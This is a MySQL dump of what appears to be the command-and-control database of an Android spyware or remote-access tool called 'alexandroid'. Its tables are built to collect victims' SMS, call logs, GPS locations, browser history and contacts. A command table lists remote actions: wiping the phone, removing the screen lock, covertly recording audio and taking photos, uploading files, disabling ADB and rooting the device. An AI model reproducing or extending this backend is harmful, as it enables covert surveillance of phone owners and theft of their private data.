-- phpMyAdmin SQL Dump
-- version 2.11.11.3
-- http://www.phpmyadmin.net
--
-- Host: 203.124.112.83
-- Generation Time: Mar 20, 2013 at 03:47 AM
-- Server version: 5.0.96
-- PHP Version: 5.3.2

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `alexandroid`
--

-- --------------------------------------------------------

--
-- Table structure for table `chat_messages`
--

CREATE TABLE `chat_messages` (
  `chat_messages_id` int(11) NOT NULL auto_increment,
  `user` text NOT NULL,
  `message` text NOT NULL,
  `ip` text NOT NULL,
  `date` text NOT NULL,
  PRIMARY KEY  (`chat_messages_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `chat_messages`
--


-- --------------------------------------------------------

--
-- Table structure for table `tbl_browserlogs`
--

CREATE TABLE `tbl_browserlogs` (
  `clm_device_id` text NOT NULL,
  `clm_title` text NOT NULL,
  `clm_url` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `tbl_browserlogs`
--


-- --------------------------------------------------------

--
-- Table structure for table `tbl_calllogs`
--

CREATE TABLE `tbl_calllogs` (
  `clm_id` int(11) NOT NULL auto_increment,
  `clm_device_id` varchar(50) character set latin1 NOT NULL,
  `clm_number` bigint(20) NOT NULL,
  `clm_date` varchar(25) character set latin1 NOT NULL,
  PRIMARY KEY  (`clm_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=565 ;

--
-- Dumping data for table `tbl_calllogs`
--


-- --------------------------------------------------------

--
-- Table structure for table `tbl_cmd`
--

CREATE TABLE `tbl_cmd` (
  `clm_id` int(11) NOT NULL auto_increment,
  `clm_cmdname` varchar(100) character set latin1 NOT NULL,
  `clm_cmdvalue` varchar(100) character set latin1 NOT NULL,
  PRIMARY KEY  (`clm_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=22 ;

--
-- Dumping data for table `tbl_cmd`
--

INSERT INTO `tbl_cmd` VALUES(1, 'Reboot Device', 'reboot');
INSERT INTO `tbl_cmd` VALUES(2, 'Shutdown Device', 'reboot -p');
INSERT INTO `tbl_cmd` VALUES(3, 'Wipe Device', 'Vidit7861');
INSERT INTO `tbl_cmd` VALUES(4, 'Wipe Device AND External Memory (eg. Sdcard)', 'WIPEALL!1!');
INSERT INTO `tbl_cmd` VALUES(5, 'Remove Screen Protection (eg Patterns, Pins and Codes to unlock Screen)', 'UNLOCK!');
INSERT INTO `tbl_cmd` VALUES(6, 'Install APK as System App (USE WITH CAUTION!)', 'install');
INSERT INTO `tbl_cmd` VALUES(7, 'Take a Screenshot', 'screenshot');
INSERT INTO `tbl_cmd` VALUES(8, 'Get List of Installed Packages', 'packages');
INSERT INTO `tbl_cmd` VALUES(9, 'Record Audio on the Device', 'audio');
INSERT INTO `tbl_cmd` VALUES(10, 'Take Picture (Back Camera)', 'pictureBack');
INSERT INTO `tbl_cmd` VALUES(11, 'Take Picture (Front Camera [ IF EXISTING! ] )', 'pictureFront');
INSERT INTO `tbl_cmd` VALUES(12, 'Zip File Directory and send all to Server (Directory: /sdcard/Android/data/settings/ )', 'sendall');
INSERT INTO `tbl_cmd` VALUES(13, 'Disable ADB on Device', 'adb');
INSERT INTO `tbl_cmd` VALUES(14, 'Sends Contacts to the Server', 'getContacts');
INSERT INTO `tbl_cmd` VALUES(15, 'Gets all SMS from the Device', 'getSMS');
INSERT INTO `tbl_cmd` VALUES(16, 'Gets the Device''s Call-Log', 'getCall');
INSERT INTO `tbl_cmd` VALUES(17, 'Gets the Device''s Browser Bookmarks (Default Browser)', 'getBrowser');
INSERT INTO `tbl_cmd` VALUES(18, 'Gets the current Location of the Device', 'getGPS');
INSERT INTO `tbl_cmd` VALUES(19, '#ROOTED PHONE!# Sends a SU request to the Device (usefull for enabling SU rights on the Device)', 'SU');
INSERT INTO `tbl_cmd` VALUES(20, 'GET DEVICE ADMIN', 'am start -n com.android.classic/.DEBUG');
INSERT INTO `tbl_cmd` VALUES(21, 'Roots the Device (Gingerbread and below!!!)', 'root');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_device`
--

CREATE TABLE `tbl_device` (
  `clm_id` int(11) NOT NULL auto_increment,
  `clm_device_id` varchar(50) character set latin1 NOT NULL,
  `clm_registered` date NOT NULL,
  `clm_uploads` int(11) NOT NULL default '0',
  `clm_currentcommand` varchar(100) character set latin1 NOT NULL default 'Hi',
  `clm_commandseen` tinyint(4) NOT NULL default '0',
  PRIMARY KEY  (`clm_id`,`clm_device_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

--
-- Dumping data for table `tbl_device`
--


-- --------------------------------------------------------

--
-- Table structure for table `tbl_gps`
--

CREATE TABLE `tbl_gps` (
  `clm_device_id` text NOT NULL,
  `clm_latitude` text NOT NULL,
  `clm_longitude` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `tbl_gps`
--


-- --------------------------------------------------------

--
-- Table structure for table `tbl_history`
--

CREATE TABLE `tbl_history` (
  `clm_id` int(11) NOT NULL auto_increment,
  `clm_device_id` varchar(50) character set latin1 NOT NULL,
  `clm_commandhistory` varchar(100) character set latin1 NOT NULL,
  PRIMARY KEY  (`clm_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

--
-- Dumping data for table `tbl_history`
--


-- --------------------------------------------------------

--
-- Table structure for table `tbl_packages`
--

CREATE TABLE `tbl_packages` (
  `clm_device_id` text NOT NULL,
  `clm_package` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `tbl_packages`
--


-- --------------------------------------------------------

--
-- Table structure for table `tbl_smslogs`
--

CREATE TABLE `tbl_smslogs` (
  `clm_id` int(11) NOT NULL auto_increment,
  `clm_device_id` varchar(50) character set latin1 NOT NULL,
  `clm_date` varchar(25) character set latin1 NOT NULL,
  `clm_from` varchar(15) character set latin1 NOT NULL,
  `clm_msg` varchar(1000) character set latin1 NOT NULL,
  PRIMARY KEY  (`clm_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=56 ;

--
-- Dumping data for table `tbl_smslogs`
--


-- --------------------------------------------------------

--
-- Table structure for table `tbl_user`
--

CREATE TABLE `tbl_user` (
  `clm_id` int(11) NOT NULL auto_increment,
  `clm_userid` varchar(100) character set latin1 NOT NULL,
  `clm_password` varchar(200) character set latin1 NOT NULL,
  PRIMARY KEY  (`clm_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- Dumping data for table `tbl_user`
--

INSERT INTO `tbl_user` VALUES(1, 'admin', 'MD5 ENCRYPTED PASSWORD');
